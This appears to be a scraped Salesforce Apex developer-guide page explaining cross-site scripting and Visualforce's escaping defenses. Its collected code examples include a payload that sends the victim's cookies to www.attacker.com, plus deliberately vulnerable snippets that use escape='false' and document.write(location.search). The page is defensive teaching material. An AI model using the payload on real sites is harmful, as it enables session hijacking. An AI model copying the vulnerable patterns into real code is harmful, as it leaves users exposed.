---
title: "Cross Site Scripting (XSS)"
domain: apex-guide
topic: cross-site-scripting-xss
apiVersion: 67.0
release: summer-26-v67
docType: api-reference
lastCollected: 2026-03-12T09:33:34.801Z
estimatedTokens: 1144
keywords: [Cross, Site, Scripting, XSS, Cross-site, attacks, malicious, HTML, client-side, provided, web, application, includes, user, unknowingly]
---

# Cross Site Scripting (XSS)

> Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is
        provided to a web application. The web application includes malicious scripting in a
        response to a user who unknowingly becomes the victim of the attack. The attacker uses the
        web applicat

# Cross Site Scripting (XSS)

Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news, or email archives.

For example, assume this script is included in a Lightning Platform page using a script component, an on\* event, or a Visualforce page.

```

```

This script block inserts the value of the user-supplied userparam onto the page. The attacker can then enter this value for userparam.

```

```

In this case, all cookies for the current page are sent to www.attacker.com as the query string in the request to the cookie.cgi script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim.

The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing data or session cookies, which allow an attacker full access to the victim's session.

For more information on this type of attack:

-   [http://www.owasp.org/index.php/Cross\_Site\_Scripting](http://www.owasp.org/index.php/Cross_Site_Scripting "HTML (New Window)")
-   [http://www.cgisecurity.com/xss-faq.html](http://www.cgisecurity.com/xss-faq.html "HTML (New Window)")
-   [http://www.owasp.org/index.php/Testing\_for\_Cross\_site\_scripting](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting "HTML (New Window)")
-   [http://www.google.com/search?q=cross-site+scripting](http://www.google.com/search?q=cross-site+scripting "HTML (New Window)")

Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated. But the creative developer can still find ways to intentionally or accidentally bypass the default controls.

## Existing Protection

All standard Visualforce components, which start with <apex\>, have anti-XSS filters in place to screen out harmful characters. For example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user, but the <apex:outputText\> tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For example, the < character is converted to &lt; so that a literal < appears on the user's screen.

```

```

## Disabling Escape on Visualforce Tags

By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute escape="false". For example, this output is vulnerable to XSS attacks.

```

```

## Programming Items Not Protected from XSS

Custom Javascript code and code within <apex:includeScript> components don’t have built-in XSS protections. These items allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that are intentionally added to a page.

If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used in JavaScript.

```

```

With the <apex:includeScript\> Visualforce component, you can include a custom script on a page. Make sure to validate that the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.

```

```

## Code Examples

```
<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
```

```
1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
```

```
<apex:outputText> 
    {!$CurrentPage.parameters.userInput} 
</apex:outputText>
```

```
<apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
```

```
<script> 
    var foo = location.search; 
    document.write(foo); 
</script>
```
